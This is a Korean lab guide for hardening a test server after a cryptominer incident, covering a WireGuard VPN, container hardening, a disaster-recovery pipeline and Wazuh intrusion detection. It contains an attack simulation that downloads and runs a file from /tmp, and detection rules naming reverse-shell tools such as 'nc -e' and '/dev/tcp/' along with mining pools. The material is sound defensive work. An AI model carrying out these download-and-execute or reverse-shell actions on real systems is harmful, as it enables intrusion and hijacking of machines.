# 141 서버 보안 강화 Lab Guide

**대상 서버**: 141.164.60.51 (Ubuntu 22.04, 15GB RAM, 187GB Disk)
**목적**: 프로덕션 적용 전 보안 인프라 검증 및 테스트
**작성일**: 2026-02-10

---

## 목차

1. [WireGuard VPN 메시 네트워크](#1-wireguard-vpn-메시-네트워크)
2. [컨테이너 보안 강화](#2-컨테이너-보안-강화)
3. [DR 파이프라인](#3-dr-파이프라인)
4. [IDS/SIEM 도입](#4-idssiem-도입)

---

## 1. WireGuard VPN 메시 네트워크

### 1.1 현재 문제

```
현재 CodeB 서버 간 통신:
┌──────────┐                    ┌──────────┐
│ App      │ ── 공용 인터넷 ──→ │ Storage  │
│ 158.247  │    (평문 가능)      │ 64.176   │
│          │    (UFW만 의존)     │ PG:5432  │
└──────────┘                    └──────────┘

문제점:
- 서버 간 트래픽이 공용 인터넷을 통과
- DB 접근을 IP 화이트리스트(UFW)에만 의존
- IP 스푸핑 시 DB 접근 가능성 존재
- TLS 없는 내부 서비스 통신 (Redis 등)
```

### 1.2 목표 아키텍처

```
WireGuard VPN Mesh (전체 암호화 터널):

          10.10.0.0/24 (VPN 대역)

  ┌────────────┐     ┌────────────┐     ┌────────────┐
  │ App Server │     │ Streaming  │     │  Storage   │
  │ 10.10.0.1  │◄───►│ 10.10.0.2  │◄───►│ 10.10.0.3  │
  │ wg0        │     │ wg0        │     │ wg0        │
  └─────┬──────┘     └────────────┘     └────────────┘
        │                                     ▲
        │            ┌────────────┐           │
        │            │  Backup    │           │
        └───────────►│ 10.10.0.4  │◄──────────┘
                     │ wg0        │
                     └────────────┘

효과:
- DB는 wg0(10.10.0.x)에서만 LISTEN → 외부 접근 완전 차단
- 모든 서버 간 통신이 WireGuard 암호화 터널 통과
- IP 스푸핑 불가 (공개키 기반 인증)
```

### 1.3 WireGuard 동작 원리

```
전통적 VPN (OpenVPN):
  - 사용자 공간에서 실행 (느림)
  - 복잡한 설정 (인증서, CA, 수십 개 옵션)
  - 코드베이스: ~100,000줄

WireGuard:
  - 커널 모듈로 실행 (빠름, 레이턴시 최소)
  - 설정 파일 10줄 이내
  - 코드베이스: ~4,000줄 (감사 용이)
  - Noise Protocol Framework (Signal과 동일한 암호화 프로토콜)
  - 키 교환: Curve25519
  - 암호화: ChaCha20-Poly1305
  - 해시: BLAKE2s
```

### 1.4 141 서버에서의 테스트 계획

```
Phase 1: 141 서버에 WireGuard 설치 및 기본 설정
Phase 2: 로컬 머신 ↔ 141 서버 간 VPN 터널 검증
Phase 3: 141 서버의 PostgreSQL/Redis를 VPN 인터페이스에만 바인딩
Phase 4: 검증 완료 후 4대 메인 서버에 순차 적용
```

#### Step 1: 설치

```bash
# 141 서버
apt update && apt install -y wireguard

# 커널 모듈 확인
modprobe wireguard
lsmod | grep wireguard
```

#### Step 2: 키 생성

```bash
# 서버 키 쌍 생성 (각 서버마다 실행)
wg genkey | tee /etc/wireguard/private.key | wg pubkey > /etc/wireguard/public.key
chmod 600 /etc/wireguard/private.key
```

각 서버의 키 쌍:
```
141 서버 (Lab):     10.10.0.10/24  ← 테스트용 IP
App 서버:           10.10.0.1/24
Streaming 서버:     10.10.0.2/24
Storage 서버:       10.10.0.3/24
Backup 서버:        10.10.0.4/24
```

#### Step 3: 141 서버 WireGuard 설정

```ini
# /etc/wireguard/wg0.conf (141 서버)
[Interface]
Address = 10.10.0.10/24
ListenPort = 51820
PrivateKey = <141서버_PRIVATE_KEY>

# App 서버 피어
[Peer]
PublicKey = <APP서버_PUBLIC_KEY>
AllowedIPs = 10.10.0.1/32
Endpoint = 158.247.203.55:51820
PersistentKeepalive = 25

# Storage 서버 피어
[Peer]
PublicKey = <STORAGE서버_PUBLIC_KEY>
AllowedIPs = 10.10.0.3/32
Endpoint = 64.176.226.119:51820
PersistentKeepalive = 25
```

#### Step 4: 인터페이스 활성화 및 테스트

```bash
# VPN 인터페이스 시작
wg-quick up wg0

# 상태 확인
wg show

# 피어 연결 테스트
ping -c 3 10.10.0.1    # App 서버
ping -c 3 10.10.0.3    # Storage 서버

# 부팅 시 자동 시작
systemctl enable wg-quick@wg0
```

#### Step 5: DB를 VPN 인터페이스에만 바인딩

```bash
# 현재 (위험):
# postgresql.conf → listen_addresses = '*'      ← 모든 인터페이스
# redis.conf     → bind 0.0.0.0                 ← 모든 인터페이스

# 변경 후 (안전):
# postgresql.conf → listen_addresses = '127.0.0.1, 10.10.0.10'  ← localhost + VPN만
# redis.conf     → bind 127.0.0.1 10.10.0.10                    ← localhost + VPN만
```

이렇게 하면 **UFW가 꺼져있어도 DB에 외부 접근 불가능** → Defense in Depth

### 1.5 검증 체크리스트

```
[ ] WireGuard 설치 및 커널 모듈 로드
[ ] 키 쌍 생성 및 교환
[ ] wg0 인터페이스 활성화
[ ] 피어 간 ping 성공
[ ] VPN 대역(10.10.0.x)에서 DB 접근 성공
[ ] 공용 IP(141.164.60.51)에서 DB 접근 차단 확인
[ ] 리부트 후 자동 연결 확인
[ ] 대역폭/레이턴시 벤치마크 (iperf3)
```

---

## 2. 컨테이너 보안 강화

### 2.1 현재 문제

```
이번 보안 사고에서 드러난 컨테이너 취약점:

App 서버 - misopin-blue:
┌─────────────────────────────────────┐
│ Docker Container                     │
│                                     │
│ • root로 실행 (UID 0)               │  ← 컨테이너 탈출 시 호스트 root
│ • 파일시스템 읽기/쓰기 가능          │  ← 마이너 다운로드 가능
│ • /tmp 실행 가능                     │  ← 마이너 실행 가능
│ • 모든 Linux Capabilities 유지      │  ← 권한 상승 가능
│ • 환경변수에 DB 비밀번호 평문        │  ← 프로세스에서 조회 가능
│                                     │
│ 결과: /tmp/n_bin (XMRig) 실행 성공   │
└─────────────────────────────────────┘
```

### 2.2 목표 아키텍처 (7 Layer Container Security)

```
┌─────────────────────────────────────────────────────────┐
│              7-Layer Container Security                   │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Layer 7: 이미지 스캐닝 (trivy, grype)                  │
│     └─ 빌드 시 CVE/악성 패키지 탐지                     │
│                                                         │
│  Layer 6: 읽기 전용 파일시스템 (--read-only)            │
│     └─ 컨테이너 내부 파일 생성/수정 완전 차단            │
│                                                         │
│  Layer 5: non-root 실행 (--user 1001:1001)              │
│     └─ 컨테이너 탈출해도 호스트에서 비특권 사용자        │
│                                                         │
│  Layer 4: Capability Drop (--cap-drop=ALL)              │
│     └─ 네트워크 raw 소켓, 마운트 등 커널 기능 차단      │
│                                                         │
│  Layer 3: Seccomp 프로파일                               │
│     └─ 허용된 시스템 콜만 실행 가능 (300+개 → ~50개)    │
│                                                         │
│  Layer 2: AppArmor/SELinux 프로파일                      │
│     └─ 파일/네트워크 접근 MAC(강제 접근 제어)            │
│                                                         │
│  Layer 1: 네트워크 격리 (--network=isolated)            │
│     └─ 컨테이너 간 불필요한 통신 차단                    │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 2.3 각 레이어 상세 설명

#### Layer 6: 읽기 전용 파일시스템

```bash
# 현재 (위험):
docker run myapp    # 컨테이너 내 어디든 파일 쓰기 가능

# 강화 후:
docker run \
  --read-only \                          # 루트 FS 읽기 전용
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \  # /tmp는 RAM, 실행 불가, 64MB 제한
  --tmpfs /var/run:rw,nosuid,size=16m \     # PID 파일용
  myapp
```

**효과**: 마이너를 다운로드해도 **디스크에 쓸 수 없음**. /tmp에는 쓸 수 있지만 **noexec으로 실행 불가**. 크기 제한(64MB)으로 대용량 페이로드 저장도 차단.

#### Layer 5: non-root 실행

```dockerfile
# Dockerfile
FROM node:20-alpine

# 전용 사용자 생성
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup

# 앱 파일 소유권 변경
COPY --chown=appuser:appgroup . /app
WORKDIR /app

# non-root로 전환
USER appuser

CMD ["node", "server.js"]
```

```bash
# docker run 시에도 강제:
docker run --user 1001:1001 myapp
```

**효과**: 컨테이너 탈출(CVE-2024-21626 등) 성공해도 호스트에서 UID 1001 (비특권). root 파일 접근 불가.

#### Layer 4: Capability Drop

```bash
# Linux에는 ~40개의 Capabilities가 있음
# 기본 Docker 컨테이너는 14개를 가짐 — 너무 많음

docker run \
  --cap-drop=ALL \           # 모든 capability 제거
  --cap-add=NET_BIND_SERVICE \  # 필요한 것만 추가 (80/443 바인딩)
  myapp
```

주요 Capability와 위험:
```
┌──────────────────┬──────────────────────────────────────┐
│ Capability       │ 위험                                 │
├──────────────────┼──────────────────────────────────────┤
│ CAP_NET_RAW      │ ARP 스푸핑, 패킷 스니핑 가능         │
│ CAP_SYS_ADMIN    │ 마운트, cgroup 조작 → 컨테이너 탈출 │
│ CAP_SYS_PTRACE   │ 다른 프로세스 디버깅/인젝션          │
│ CAP_NET_ADMIN    │ 방화벽 규칙 변경, IP 변경            │
│ CAP_DAC_OVERRIDE │ 파일 권한 무시                       │
│ CAP_SETUID       │ UID 변경 → 권한 상승                │
└──────────────────┴──────────────────────────────────────┘
→ cap-drop=ALL 하면 위 모든 위험 제거
```

#### Layer 3: Seccomp 프로파일

```
Seccomp(Secure Computing Mode):
커널 레벨에서 시스템 콜을 필터링하는 메커니즘

Linux 시스템 콜: ~300+개
Docker 기본 Seccomp: ~44개 차단
커스텀 Seccomp: Node.js 앱에 필요한 ~50개만 허용
```

```json
// /etc/docker/seccomp/nodejs-strict.json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "close", "fstat", "mmap",
        "mprotect", "munmap", "brk", "ioctl",
        "socket", "connect", "accept", "bind", "listen",
        "sendto", "recvfrom", "sendmsg", "recvmsg",
        "epoll_create1", "epoll_ctl", "epoll_wait",
        "clone", "execve", "exit_group", "futex",
        "openat", "getpid", "gettid", "nanosleep",
        "clock_gettime", "sigaltstack", "rt_sigaction",
        "rt_sigprocmask", "getuid", "getgid",
        "geteuid", "getegid", "fcntl", "pipe2",
        "getrandom", "pread64", "pwrite64",
        "newfstatat", "set_tid_address",
        "set_robust_list", "rseq", "prlimit64"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

```bash
# 적용:
docker run \
  --security-opt seccomp=/etc/docker/seccomp/nodejs-strict.json \
  myapp
```

**차단되는 위험한 시스템 콜**:
```
ptrace      → 프로세스 인젝션/디버깅 차단
mount       → 파일시스템 마운트 차단 (탈출 방지)
unshare     → 네임스페이스 조작 차단
keyctl      → 커널 키링 접근 차단
kexec_load  → 커널 교체 차단
reboot      → 시스템 리부트 차단
```

#### Layer 7: 이미지 스캐닝

```bash
# Trivy로 이미지 스캔 (CI/CD에 통합)
trivy image myapp:latest

# 결과 예시:
# Total: 3 (HIGH: 2, CRITICAL: 1)
# ┌──────────────┬────────────┬──────────┬───────────────┐
# │   Library    │   CVE      │ Severity │ Fixed Version │
# ├──────────────┼────────────┼──────────┼───────────────┤
# │ bcryptjs     │ CVE-2024-  │ CRITICAL │ 3.0.4         │  ← 이번 사고의 원인!
# │ lodash       │ CVE-2021-  │ HIGH     │ 4.17.21       │
# └──────────────┴────────────┴──────────┴───────────────┘
```

### 2.4 141 서버에서의 테스트 계획

```bash
# 현재 141 서버에서 실행 중인 컨테이너로 테스트:
# - warehouse-web (Podman)
# - project-cms-postgres (Podman)

# Step 1: 현재 컨테이너 보안 상태 감사
docker inspect warehouse-web | jq '.[0].HostConfig | {
  ReadonlyRootfs,
  CapAdd,
  CapDrop,
  SecurityOpt,
  User,
  Tmpfs
}'

# Step 2: 보안 강화된 설정으로 재배포
podman run \
  --name warehouse-web-hardened \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=64m \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --security-opt=no-new-privileges:true \
  --user 1001:1001 \
  --security-opt seccomp=/etc/docker/seccomp/nodejs-strict.json \
  --memory=512m \
  --cpus=1.0 \
  --pids-limit=100 \
  warehouse-web:latest

# Step 3: 기능 테스트 — 앱이 정상 동작하는지 확인
# Step 4: 공격 시뮬레이션 — 마이너 다운로드/실행 시도
```

### 2.5 공격 시뮬레이션으로 검증

```bash
# 보안 강화 전 (기존):
docker exec warehouse-web sh -c "
  curl -o /tmp/test http://example.com/file   # ✅ 다운로드 성공
  chmod +x /tmp/test                          # ✅ 실행 권한 부여
  /tmp/test                                   # ✅ 실행 성공 → 마이너 동작
"

# 보안 강화 후:
docker exec warehouse-web-hardened sh -c "
  curl -o /tmp/test http://example.com/file   # ✅ 다운로드는 가능 (tmpfs에)
  chmod +x /tmp/test                          # ❌ noexec → 의미 없음
  /tmp/test                                   # ❌ Permission denied (noexec)
  curl -o /app/test http://example.com/file   # ❌ Read-only file system
"
```

### 2.6 전체 적용 Docker Compose 예시

```yaml
# docker-compose.hardened.yml
version: '3.8'

services:
  web:
    image: myapp:latest
    read_only: true
    user: "1001:1001"
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=64m
      - /var/run:rw,nosuid,size=16m
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    security_opt:
      - no-new-privileges:true
      - seccomp:/etc/docker/seccomp/nodejs-strict.json
    deploy:
      resources:
        limits:
          memory: 512M
          cpus: '1.0'
          pids: 100
    networks:
      - frontend
    # 환경변수 대신 Docker Secrets 사용
    secrets:
      - db_password
    environment:
      - DATABASE_URL=file:///run/secrets/db_password

  postgres:
    image: postgres:16-alpine
    read_only: true
    user: "999:999"
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=128m
      - /run/postgresql:rw,nosuid,size=16m
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    volumes:
      - pgdata:/var/lib/postgresql/data  # 데이터만 쓰기 허용
    networks:
      - backend                           # 프론트엔드 네트워크와 격리

secrets:
  db_password:
    file: ./secrets/db_password.txt

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true    # 외부 인터넷 접근 차단!
```

### 2.7 검증 체크리스트

```
[ ] 현재 컨테이너 보안 상태 감사 (docker inspect)
[ ] Seccomp 프로파일 작성 및 테스트
[ ] read-only + tmpfs noexec 설정 후 앱 정상 동작 확인
[ ] non-root 실행 후 앱 정상 동작 확인
[ ] cap-drop=ALL 후 앱 정상 동작 확인
[ ] 마이너 다운로드/실행 시뮬레이션 → 차단 확인
[ ] Docker Secrets으로 환경변수 비밀번호 교체
[ ] 네트워크 격리 (internal: true) 후 DB 접근만 허용 확인
[ ] Trivy 이미지 스캔 CI/CD 통합
[ ] 리소스 제한 (memory, cpus, pids-limit) 설정
```

---

## 3. DR 파이프라인

### 3.1 현재 문제

```
현재 DR(Disaster Recovery) 상황:

1. 서버가 해킹되면?
   └─ 수동으로 SSH 접속 → 수동 분석 → 수동 복구
   └─ 복구 시간: 수 시간~수 일

2. 하드웨어 장애 시?
   └─ Vultr 대시보드에서 수동으로 새 서버 생성
   └─ 수동으로 모든 서비스 재설치
   └─ 복구 시간: 수 시간

3. 백업은?
   └─ Backup 서버(141.164.37.63)에 존재
   └─ 하지만 자동 복원 파이프라인 없음
   └─ 복원 테스트한 적 없음 ← 가장 위험!

"테스트하지 않은 백업은 백업이 아니다"
```

### 3.2 목표 아키텍처

```
┌─────────────────────────────────────────────────────────────────┐
│                    DR Pipeline Architecture                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────┐    감지     ┌──────────┐   자동    ┌──────────┐   │
│  │ 장애감지  │ ────────→  │ 판단     │ ───────→ │ 복구     │   │
│  │          │            │          │          │          │   │
│  │ • Health │            │ • 자동   │          │ • 서버   │   │
│  │   Check  │            │   복구?  │          │   생성   │   │
│  │ • Alert  │            │ • 수동   │          │ • 설정   │   │
│  │   Manager│            │   개입?  │          │   배포   │   │
│  └──────────┘            └──────────┘          │ • 데이터 │   │
│                                                │   복원   │   │
│                                                │ • DNS    │   │
│                                                │   전환   │   │
│                                                └──────────┘   │
│                                                                  │
│  RTO (목표 복구 시간): < 15분                                    │
│  RPO (목표 복구 시점): < 5분 (WAL 스트리밍)                      │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 DR 3단계: 백업 → 복원 → DNS 전환

#### Stage 1: 백업 시스템

```
┌─────────────────────────────────────────────────────────┐
│                    백업 전략 (3-2-1)                      │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  3 copies:  원본 + 로컬 백업 + 원격 백업                │
│  2 media:   디스크 + 오브젝트 스토리지 (S3/MinIO)       │
│  1 offsite: Backup 서버 (물리적으로 다른 DC)            │
│                                                         │
│  PostgreSQL:                                            │
│  ├─ 연속 WAL 아카이빙 (실시간)                          │
│  ├─ pg_basebackup (일 1회 풀 백업)                      │
│  └─ PITR (Point-in-Time Recovery) 가능                  │
│                                                         │
│  Redis:                                                 │
│  ├─ RDB 스냅샷 (매 1시간)                               │
│  └─ AOF (Append Only File) 실시간                       │
│                                                         │
│  MinIO/파일:                                            │
│  ├─ rclone sync (매 6시간)                              │
│  └─ 버전 관리 활성화                                    │
│                                                         │
│  서버 설정:                                             │
│  ├─ /etc, /opt/codeb → git 버전 관리                    │
│  └─ Docker images → GHCR (이미 구축됨)                  │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

#### Stage 2: 복원 프로세스

```bash
# 복원 스크립트 예시: restore-storage.sh

#!/bin/bash
set -euo pipefail

TARGET_SERVER=$1       # 새 서버 IP
BACKUP_SOURCE=$2       # 백업 서버 IP (141.164.37.63)

echo "[1/5] 기본 패키지 설치..."
ssh root@$TARGET_SERVER "
  apt update && apt install -y \
    postgresql-16 redis-server minio \
    wireguard ufw
"

echo "[2/5] PostgreSQL 데이터 복원..."
ssh root@$TARGET_SERVER "
  systemctl stop postgresql
  rm -rf /var/lib/postgresql/16/main/*
"
# PITR 복원 — 특정 시점까지 복구
ssh root@$BACKUP_SOURCE "
  pg_basebackup -h $BACKUP_SOURCE -U replicator \
    -D - -Ft -z | ssh root@$TARGET_SERVER \
    'tar xzf - -C /var/lib/postgresql/16/main/'
"
# recovery.conf로 WAL 재생
ssh root@$TARGET_SERVER "
  cat > /var/lib/postgresql/16/main/recovery.signal
  echo \"restore_command = 'cp /backup/wal/%f %p'\" >> postgresql.auto.conf
  echo \"recovery_target_time = '2026-02-10 22:00:00+09'\" >> postgresql.auto.conf
  systemctl start postgresql
"

echo "[3/5] Redis 데이터 복원..."
ssh root@$TARGET_SERVER "
  systemctl stop redis
  scp root@$BACKUP_SOURCE:/backup/redis/dump.rdb /var/lib/redis/
  chown redis:redis /var/lib/redis/dump.rdb
  systemctl start redis
"

echo "[4/5] WireGuard VPN 설정..."
ssh root@$TARGET_SERVER "
  cp /backup/wireguard/wg0.conf /etc/wireguard/
  wg-quick up wg0
"

echo "[5/5] 서비스 시작 및 헬스체크..."
ssh root@$TARGET_SERVER "
  systemctl start postgresql redis minio
  # 헬스체크
  pg_isready && echo 'PostgreSQL: OK'
  redis-cli ping && echo 'Redis: OK'
  curl -sf http://localhost:9000/minio/health/live && echo 'MinIO: OK'
"
```

#### Stage 3: DNS 전환 시뮬레이션

```
DNS 전환 시나리오:

시점 T+0: Storage 서버 장애 감지
  └─ AlertManager → Slack 알림 + PagerDuty

시점 T+2분: 자동 복원 파이프라인 시작
  └─ Terraform으로 새 서버 프로비저닝
  └─ 또는 141 서버를 대체 Storage로 전환

시점 T+10분: 데이터 복원 완료
  └─ PostgreSQL PITR 복원
  └─ Redis RDB 로드
  └─ WireGuard 키 재설정

시점 T+12분: DNS 전환
  ┌──────────────────────────────────────────────┐
  │ Cloudflare API 호출:                          │
  │                                              │
  │ 변경 전: db.codeb.kr → 64.176.226.119       │
  │ 변경 후: db.codeb.kr → 141.164.60.51        │
  │                                              │
  │ TTL: 60초 (사전에 낮춰놓음)                   │
  │ Proxy: Off (DB는 직접 연결 필요)              │
  └──────────────────────────────────────────────┘

시점 T+15분: 서비스 정상화 확인
  └─ App 서버에서 DB 연결 테스트
  └─ 사용자 영향: 세션 재연결 필요 (자동)
```

### 3.4 141 서버에서의 테스트 계획

```
141 서버를 "가상 Storage 서버"로 변환하여 전체 DR 파이프라인 검증:

Phase 1: 백업 설정
  - Backup 서버 → 141 서버로 pg_basebackup 복원 테스트
  - WAL 아카이빙 설정 및 PITR 테스트

Phase 2: 복원 자동화
  - restore-storage.sh 스크립트 작성 및 실행
  - 복원 소요 시간 측정

Phase 3: DNS 전환 시뮬레이션
  - 테스트 도메인(test-db.codeb.kr)으로 DNS 전환 테스트
  - App 서버 → 141 서버 DB 연결 전환 검증

Phase 4: 전체 DR 드릴
  - "Storage 서버 장애" 시나리오 가정
  - 감지 → 복원 → DNS 전환 → 정상화 전체 과정 실행
  - RTO 15분 이내 달성 확인
```

### 3.5 검증 체크리스트

```
[ ] pg_basebackup으로 141 서버에 풀 백업 복원
[ ] PITR로 특정 시점 복구 성공
[ ] Redis RDB 복원 성공
[ ] WireGuard 키 교환 및 터널 복구
[ ] 복원 스크립트 자동화 완료
[ ] DNS 전환 (test-db.codeb.kr → 141 서버) 성공
[ ] App 서버에서 전환된 DB 연결 정상 확인
[ ] 전체 DR 드릴 실행 → RTO 측정
[ ] 결과 문서화 및 프로덕션 적용 계획 수립
```

---

## 4. IDS/SIEM 도입

### 4.1 현재 문제

```
현재 보안 모니터링 상태:

┌─────────────────────────────────────────────────┐
│ 감지 수단:                                       │
│ • UFW 로그 (수동 확인)                           │
│ • Docker 로그 (수동 확인)                        │
│ • ps aux (수동 실행)                             │
│ • 없음 (실시간 자동 감지 시스템 없음)            │
│                                                  │
│ 이번 사고에서:                                   │
│ • 마이너가 수 일~수 주간 실행됨                  │
│ • 감지 시점: 수동 조사 시작 후                   │
│ • 자동 알림: 없었음                              │
│                                                  │
│ "침입을 감지하지 못한다면 방어할 수 없다"        │
└─────────────────────────────────────────────────┘
```

### 4.2 IDS와 SIEM 차이

```
┌──────────────────────────────────────────────────────────────┐
│                    IDS vs SIEM                                │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  IDS (Intrusion Detection System):                           │
│  "침입 탐지 시스템"                                          │
│  ├─ 네트워크 패킷/호스트 활동을 실시간 분석                  │
│  ├─ 시그니처(알려진 공격) + 이상행위(비정상 패턴) 감지       │
│  └─ 도구: Suricata, Snort, OSSEC/Wazuh                      │
│                                                              │
│  SIEM (Security Information & Event Management):             │
│  "보안 정보 및 이벤트 관리"                                   │
│  ├─ 여러 소스의 로그를 중앙 수집/분석/상관관계               │
│  ├─ 대시보드, 알림, 컴플라이언스 보고서                      │
│  └─ 도구: Wazuh, ELK Stack + Security, Grafana Loki         │
│                                                              │
│  관계:                                                       │
│  IDS가 "센서"라면 SIEM은 "컨트롤 타워"                       │
│  IDS → 이벤트 생성 → SIEM → 분석/알림/대응                   │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 4.3 도구 선택: Wazuh (IDS + SIEM 통합)

```
왜 Wazuh인가?

┌────────────────┬──────────────┬──────────────┬──────────────┐
│ 기능           │ OSSEC        │ Suricata     │ Wazuh        │
├────────────────┼──────────────┼──────────────┼──────────────┤
│ HIDS (호스트)  │ ✅           │ ❌           │ ✅           │
│ NIDS (네트워크)│ ❌           │ ✅           │ ✅ (연동)    │
│ 로그 분석      │ 기본         │ ❌           │ ✅ (고급)    │
│ 파일 무결성    │ ✅           │ ❌           │ ✅           │
│ 취약점 스캔    │ ❌           │ ❌           │ ✅           │
│ 컨테이너 감시  │ ❌           │ ❌           │ ✅           │
│ 대시보드       │ ❌           │ 기본         │ ✅ (웹 UI)   │
│ 알림 통합      │ 기본         │ 기본         │ ✅ (Slack등) │
│ 무료           │ ✅           │ ✅           │ ✅           │
│ 유지보수       │ ⚠️ 느림      │ ✅           │ ✅ (활발)    │
├────────────────┼──────────────┼──────────────┼──────────────┤
│ 결론           │ 레거시       │ 네트워크만   │ 올인원 ✅    │
└────────────────┴──────────────┴──────────────┴──────────────┘

Wazuh = OSSEC 포크 + SIEM 기능 + 웹 대시보드 + 컨테이너 지원
→ 하나의 도구로 IDS + SIEM 모두 해결
```

### 4.4 Wazuh 아키텍처

```
┌─────────────────────────────────────────────────────────────────┐
│                      Wazuh Architecture                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │ App Server   │  │ Streaming    │  │ Storage      │          │
│  │              │  │              │  │              │          │
│  │ wazuh-agent  │  │ wazuh-agent  │  │ wazuh-agent  │          │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘          │
│         │                  │                  │                   │
│         └──────────────────┼──────────────────┘                  │
│                            │ (암호화 채널)                        │
│                            ▼                                     │
│                   ┌──────────────────┐                           │
│                   │  141 Server      │                           │
│                   │  (Wazuh Manager) │                           │
│                   │                  │                           │
│                   │  • wazuh-manager │  ← 이벤트 수신/분석       │
│                   │  • wazuh-indexer │  ← 로그 인덱싱/검색       │
│                   │  • wazuh-dashboard│ ← 웹 UI (포트 443)       │
│                   └──────────────────┘                           │
│                                                                  │
│  141 서버 = Wazuh Manager (중앙 관제)                            │
│  나머지 4대 = Wazuh Agent (센서)                                 │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 4.5 Wazuh가 감지하는 것들

```
이번 사고에서 Wazuh가 있었다면 감지했을 항목:

1. 파일 무결성 모니터링 (FIM)
   ┌────────────────────────────────────────────────────┐
   │ ALERT: New file created in /tmp                     │
   │ File: /tmp/n_bin                                    │
   │ Size: 6.3MB                                         │
   │ SHA256: a1b2c3...                                   │
   │ Rule: 554 - File added to the system                │
   │ Severity: HIGH                                      │
   └────────────────────────────────────────────────────┘
   → /tmp, /var/tmp에 바이너리 생성 즉시 알림

2. 프로세스 이상 감지
   ┌────────────────────────────────────────────────────┐
   │ ALERT: Suspicious process detected                  │
   │ Process: /tmp/n_bin                                 │
   │ CPU: 98%                                            │
   │ Parent: node (PID 12345)                            │
   │ Connection: gulf.moneroocean.stream:10128           │
   │ Rule: 100210 - Crypto mining activity detected      │
   │ Severity: CRITICAL                                  │
   └────────────────────────────────────────────────────┘
   → 마이닝 풀 연결 패턴 자동 감지

3. Rootkit 탐지
   ┌────────────────────────────────────────────────────┐
   │ ALERT: Hidden file with immutable attribute         │
   │ File: /var/tmp/system-check                         │
   │ Attributes: ----i---------e---                      │
   │ Rule: 510 - Immutable attribute set on file         │
   │ Severity: HIGH                                      │
   └────────────────────────────────────────────────────┘
   → chattr +i 지속성 메커니즘 자동 감지

4. 네트워크 이상 감지
   ┌────────────────────────────────────────────────────┐
   │ ALERT: Outbound connection to known mining pool     │
   │ Destination: pool.supportxmr.com:3333               │
   │ Source: 141.164.60.51:43567                         │
   │ Rule: 100215 - Connection to cryptocurrency pool    │
   │ Severity: CRITICAL                                  │
   └────────────────────────────────────────────────────┘

5. 로그 분석 (SSH 브루트포스)
   ┌────────────────────────────────────────────────────┐
   │ ALERT: Multiple authentication failures             │
   │ Source IP: 203.0.113.50                             │
   │ Attempts: 150 in 60 seconds                         │
   │ Rule: 5710 - SSH brute force attack                 │
   │ Action: Active Response → firewall-drop             │
   │ Severity: HIGH                                      │
   └────────────────────────────────────────────────────┘
   → 자동으로 공격 IP를 방화벽에서 차단 (Active Response)
```

### 4.6 141 서버에서의 설치 계획

#### Step 1: Wazuh Manager 설치 (141 서버)

```bash
# All-in-one 설치 (Manager + Indexer + Dashboard)
curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
bash wazuh-install.sh -a

# 설치 완료 후:
# Dashboard: https://141.164.60.51:443
# 초기 계정: admin / <자동생성 비밀번호>
```

리소스 요구사항:
```
┌───────────────┬────────────┬──────────────┐
│ 컴포넌트       │ 최소       │ 141 서버     │
├───────────────┼────────────┼──────────────┤
│ RAM           │ 4GB        │ 15GB ✅      │
│ CPU           │ 2 cores    │ 4 cores ✅   │
│ Disk          │ 50GB       │ 90GB free ✅ │
│ Agents        │ 최대 100   │ 4~5대 ✅     │
└───────────────┴────────────┴──────────────┘
→ 141 서버 사양으로 충분
```

#### Step 2: 각 서버에 Agent 설치

```bash
# App 서버 (158.247.203.55)에서:
curl -sO https://packages.wazuh.com/4.9/wazuh-agent_4.9.0-1_amd64.deb
WAZUH_MANAGER="141.164.60.51" dpkg -i wazuh-agent_4.9.0-1_amd64.deb
systemctl enable --now wazuh-agent

# 동일하게 Streaming, Storage, Backup 서버에도 설치
```

#### Step 3: 커스텀 탐지 규칙

```xml
<!-- /var/ossec/etc/rules/local_rules.xml -->

<!-- 크립토 마이너 감지 -->
<group name="crypto_mining">
  <rule id="100210" level="15">
    <if_sid>530</if_sid>
    <match>monero|xmrig|stratum|mining|cryptonight</match>
    <description>Crypto mining activity detected</description>
  </rule>

  <rule id="100211" level="15">
    <if_sid>530</if_sid>
    <match>gulf.moneroocean|supportxmr|nanopool|2miners</match>
    <description>Connection to known mining pool</description>
  </rule>
</group>

<!-- /tmp 실행 파일 감지 -->
<group name="suspicious_files">
  <rule id="100220" level="12">
    <if_sid>554</if_sid>
    <match>/tmp/|/var/tmp/</match>
    <description>Executable file created in temp directory</description>
  </rule>

  <rule id="100221" level="14">
    <if_sid>550</if_sid>
    <match>immutable</match>
    <description>File with immutable attribute detected</description>
  </rule>
</group>

<!-- 리버스 쉘 감지 -->
<group name="reverse_shell">
  <rule id="100230" level="15">
    <if_sid>530</if_sid>
    <match>nc -e|bash -i|/dev/tcp/|python.*socket.*connect</match>
    <description>Possible reverse shell activity</description>
  </rule>
</group>
```

#### Step 4: Active Response (자동 대응)

```xml
<!-- /var/ossec/etc/ossec.conf -->
<active-response>
  <!-- SSH 브루트포스 → 자동 IP 차단 -->
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5710,5711,5712</rules_id>
  <timeout>3600</timeout>  <!-- 1시간 차단 -->
